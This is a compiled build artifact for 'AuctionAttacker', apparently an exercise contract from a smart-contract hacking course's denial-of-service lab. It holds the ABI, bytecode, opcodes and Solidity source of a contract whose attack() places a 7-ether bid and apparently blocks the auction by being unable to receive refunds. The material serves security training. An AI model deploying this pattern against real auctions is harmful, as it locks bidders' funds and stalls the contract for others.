{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_action",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "auction",
      "outputs": [
        {
          "internalType": "contract IAuction",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "608060405260405161019838038061019883398101604081905261002291610047565b600080546001600160a01b0319166001600160a01b0392909216919091179055610077565b60006020828403121561005957600080fd5b81516001600160a01b038116811461007057600080fd5b9392505050565b610112806100866000396000f3fe60806040526004361060265760003560e01c80637d9f6db514602b5780639e5faafc146065575b600080fd5b348015603657600080fd5b506000546049906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b606b606d565b005b60008054906101000a90046001600160a01b03166001600160a01b0316631998aeef676124fee993bc00006040518263ffffffff1660e01b81526004016000604051808303818588803b15801560c257600080fd5b505af115801560d5573d6000803e3d6000fd5b505050505056fea2646970667358221220492ef6e631ac4e1bebc388e9d60455904e5586a8d8d0dbd4139128abc4560e5764736f6c63430008130033",
  "bytecodeSha1": "893821ba0307d0dba17c2c0d6c87355791c5f01d",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AuctionAttacker",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x26 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D9F6DB5 EQ PUSH1 0x2B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x65 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x49 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x6B PUSH1 0x6D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x1998AEEF PUSH8 0x6124FEE993BC0000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xC2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xD5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x49 0x2E 0xF6 0xE6 BALANCE 0xAC 0x4E SHL 0xEB 0xC3 DUP9 0xE9 0xD6 DIV SSTORE SWAP1 0x4E SSTORE DUP7 0xA8 0xD8 0xD0 0xDB 0xD4 SGT SWAP2 0x28 0xAB 0xC4 JUMP 0xE JUMPI PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "sha1": "edbff3042696292856742676205f7baefbdeb111",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\n/**\n * @title Auction\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\n\ninterface IAuction{\n    function bid() external payable;\n}\n\ncontract AuctionAttacker {\n\n    IAuction public auction;\n\n    constructor(address _action) payable {\n        auction = IAuction(_action);\n    }\n    function attack() external payable {\n        auction.bid{value: 7 ether}();\n\n    }\n}",
  "sourcePath": "contracts/dos-2/AuctionAttacker.sol",
  "type": "contract"
}